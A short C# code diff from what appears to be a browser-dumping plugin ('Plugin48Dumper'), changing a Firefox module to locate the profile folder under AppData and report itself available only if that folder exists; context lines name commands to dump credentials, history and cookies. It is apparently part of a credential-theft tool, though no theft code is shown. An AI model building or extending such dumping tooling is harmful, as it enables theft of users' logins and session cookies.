@@ -21,6 +21,8 @@ namespace Plugin48Dumper
         public string BrowserName { get { return "Firefox"; } }
         public DataTable dtHelp = new DataTable();
 
+        private string m_szFirefoxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\");
+
         public clsFirefoxDumper()
         {
             Entry = "firefox";
@@ -34,7 +36,7 @@ namespace Plugin48Dumper
             dtHelp.Rows.Add("history", "Dump browser history records.");
             dtHelp.Rows.Add("cookie", "Dump browser cookies.");
 
-            Available = true;
+            Available = Directory.Exists(m_szFirefoxPath);
         }
 
         public List<clsCredential> fnDumpCredential(int nCount, string szRegex)
